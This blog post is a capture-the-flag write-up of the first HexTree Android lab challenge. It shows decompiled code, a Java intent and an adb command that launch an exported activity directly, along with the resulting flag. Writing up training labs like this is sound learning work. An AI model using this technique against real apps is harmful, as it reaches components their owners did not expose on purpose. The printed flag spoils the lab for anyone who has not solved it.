---
title: Hextree Activities Challanges
date: 2025-06-20 20:14 +0300
categories: [Penetration Testing]
tags: [Android Challenges, Activity, Penetration Testing, Hextree]
author: 0xAokiji
---

# **Introduction**

In this write-up, I’m sharing how I approached and solved the Android app challenges from the [HexTree Android Penetration Testing Lab](https://app.hextree.io/map). These challenges are made to help you think like a real Android penetration tester, and they cover everything from simple static analysis to more advanced dynamic stuff.

I mainly focused on understanding how the apps work, finding weak points, and then trying to exploit them using different tools and techniques.

Here are some of the tools I used along the way:

- **JADX**, **APKTool** – for looking into the app’s code
- **Frida**, **ADB** – for playing with the app at runtime
- **Android Studio**, **logcat** – for debugging and seeing what's going on behind the scenes

In each challenge, I’ll give

- A quick overview of what the app does
- The vulnerability or trick I found
- How I exploited it
- And finally, the flag or result I got

### In the next part, I’ll be showing the challenges related to **Activities.**

<img src="/assets/img/2025-06-20-hextree-activities-challenges/image.png" alt="Custom Domain" style="width: 400px; height: 700px;" />
_My Appliction_

## Challenge 1: Basic_Exported

### Code Snippet (From Decompiled Source)

```java
public class Flag1Activity extends AppCompactActivity {
    public Flag1Activity() {
    }
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);
        this.f.addTag("basic-main-activity-avd2");
        success(this);
    }
}
```

- Launch the `Flag1Activity` directly to trigger the `success()` method and capture the flag.

## Solution

### Using Java Code (within another Activity):

```java
Intent intent = new Intent();
ComponentName componentName = new ComponentName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.activities.Flag1Activity"
);
intent.setComponent(componentName);
startActivity(intent);
```

<img src="/assets/img/2025-06-20-hextree-activities-challenges/Pasted image.png" alt="Custom Domain" style="width: 900px; height: 100px;" />

**Flag = HXT{basic-exported-activity-1bh7sd}**


## Using ADB (recommended for quick testing):

- **`adb shell am start -n io.hextree.attacksurface/.activities.Flag1Activity`**